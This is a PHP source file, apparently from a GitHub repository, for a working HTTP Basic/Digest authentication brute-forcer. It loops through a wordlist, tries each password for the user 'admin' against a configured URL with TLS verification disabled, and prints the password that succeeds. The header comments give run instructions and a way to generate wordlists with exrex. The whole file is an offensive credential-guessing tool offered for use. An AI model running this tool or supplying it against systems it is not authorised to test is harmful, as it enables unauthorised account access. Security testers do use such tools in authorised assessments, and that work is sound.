<?php
# Author: Nexis81 
# GitHub URL: https://github.com/Nexis81
# GitHub Repo: https://github.com/Nexis81/HTTP-Auth-Crack


# How to run 
# php httpauthcrack.php <dictionary_file>

# How to create a dictionary file
# exrex '<regex>' >> dict.txt

# CONFIG
    define("URL","http://<URL>");
    define("AUTH_USER","admin");
    define("TIMEOUT",30);
    define("VERBOSE",TRUE);
    define("DEBUG",FALSE);
    define("ERRLOG",FALSE);
    define("ERRLOG_FILE","errorlog.txt");
    
# END CONFIG

    if (count($argv) == 1) {
        define("DICT_FILE","dict.txt");
    } else {
        define("DICT_FILE",$argv[1]);
    }
if (VERBOSE) {
    echo "Using Dictionary File: " . DICT_FILE . "\n";
}
    $found = 0;
    $tries = 0;
    foreach (file(DICT_FILE) as $line) {
        $auth_pass = trim(preg_replace('/\s+/', ' ', $line));
        
        if(DEBUG){
            echo $auth_pass."\n";
        }
        else{

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, URL);
            //curl_setopt($ch, CURLOPT_HEADER, 0);
            //curl_setopt($ch, CURLOPT_USERAGENT, $ua);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_FAILONERROR, 1); // Fail on HTTP code >= 400.
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            if (ERRLOG) {
                $fp = fopen(dirname(__FILE__) . '/' . ERRLOG_FILE, 'a');
                curl_setopt($ch, CURLOPT_STDERR, $fp);
            }

            if(AUTH_USER || $auth_pass)
            {
                curl_setopt($ch, CURLOPT_USERPWD, AUTH_USER.":".$auth_pass);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
            }
            if(TIMEOUT){
                curl_setopt($ch, CURLOPT_TIMEOUT, TIMEOUT); // Timeout for entire call.
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
            }
            // To follow 302 redirects:
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_MAXREDIRS, 100);
            $contents = curl_exec($ch);
            if($error = curl_error($ch))
            {
                if(VERBOSE) echo "Try (" . ++$tries . "): ".$auth_pass."\n";
            }
            else{
                $found = 1;
                echo "Found (" . ++$tries . "): ".$auth_pass."\n";
                exit;
            }
            curl_close($ch);
        }
    }
?>
